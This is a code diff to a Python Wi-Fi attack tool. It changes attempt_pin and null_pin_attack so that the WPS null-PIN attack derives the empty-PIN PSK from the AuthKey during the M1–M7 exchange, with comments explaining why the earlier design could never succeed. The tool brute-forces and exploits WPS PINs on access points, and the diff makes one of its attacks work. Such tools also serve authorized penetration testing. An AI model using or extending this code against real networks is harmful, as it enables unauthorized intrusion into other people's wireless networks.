@@ -363,8 +363,7 @@ def attempt_pin(
     ssid: str,
     channel: int | None = None,
     msg_timeout: float = 5.0,
-    psk1_override: bytes | None = None,
-    psk2_override: bytes | None = None,
+    null_pin: bool = False,
     eapol_versions: tuple[int, ...] = (2, 1),
     passive: bool = False,
     pre_eapol_delay: float = 0.0,
@@ -373,14 +372,19 @@ def attempt_pin(
 ) -> AttemptResult:
     """Run one full association + M1..M7 cycle for a single 8-digit PIN guess.
 
-    `psk1_override`/`psk2_override` bypass the normal split_pin(pin8) ->
-    psk_half() derivation (used by the null-PIN attack, an empty PIN).
+    `null_pin=True` skips the split_pin(pin8) derivation and instead uses
+    the empty-PIN PSK, psk_half(AuthKey, b"") -- the correct value for the
+    null-PIN attack (some AP firmware accepts a blank configured PIN).
+    AuthKey only exists after M1/M3, so this must be a flag resolved
+    inside the exchange, not precomputed PSK bytes passed in (the
+    original psk*_override=b"" design -- zero-length PSKs produce wrong
+    R-Hashes and could never succeed).
 
     Every exit path sends an explicit EAP-Failure instead of going silent,
     so an abandoned session doesn't leave the AP's WPS state machine stuck.
     """
-    if psk1_override is None and pin8 is None:
-        raise ValueError("attempt_pin needs either pin8 or both psk*_override")
+    if not null_pin and pin8 is None:
+        raise ValueError("attempt_pin needs either pin8 or null_pin=True")
     log = progress_fn or (lambda msg: None)
     if ensure_channel(iface, channel):
         log(f"channel set to {channel}")
@@ -471,11 +475,13 @@ def attempt_pin(
     last_identifier = m3_frame.identifier
     log("M3 received — sending M4")
 
-    if psk1_override is not None and psk2_override is not None:
-        psk1, psk2 = psk1_override, psk2_override
+    if null_pin:
+        # Empty-PIN PSK: same derivation pixie.py uses for its empty_psk
+        # candidate check (HMAC-SHA256(AuthKey, b"")[:16]).
+        psk1 = psk2 = psk_half(keys.auth_key, b"")
     else:
         if pin8 is None:
-            raise ValueError("attempt_pin needs either pin8 or both psk*_override")
+            raise ValueError("attempt_pin needs either pin8 or null_pin=True")
         half1, half2 = split_pin(pin8)
         psk1 = psk_half(keys.auth_key, half1)
         psk2 = psk_half(keys.auth_key, half2)
@@ -694,7 +700,7 @@ def null_pin_attack(
     """
     return attempt_pin(
         iface, bssid, None, ssid, channel=channel, msg_timeout=msg_timeout,
-        psk1_override=b"", psk2_override=b"", progress_fn=progress_fn, stop_event=stop_event,
+        null_pin=True, progress_fn=progress_fn, stop_event=stop_event,
     )
 
 
